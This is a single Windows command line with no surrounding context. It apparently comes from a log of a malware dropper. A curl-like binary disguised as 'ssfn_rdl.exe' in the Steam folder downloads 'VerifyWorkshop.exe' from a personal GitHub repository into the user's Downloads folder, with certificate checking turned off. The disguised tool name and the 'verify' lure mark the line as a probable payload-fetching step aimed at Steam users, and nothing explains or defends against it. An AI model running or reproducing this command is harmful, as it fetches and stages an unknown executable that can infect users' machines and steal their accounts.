...
"C:\Program Files (x86)\steam\ssfn_rdl.exe" -LJk "https://github.com/tobiasmulln/Testing/raw/main/VerifyWorkshop.exe" --output "C:\Users\user\Downloads\VerifyWorkshop.exe"
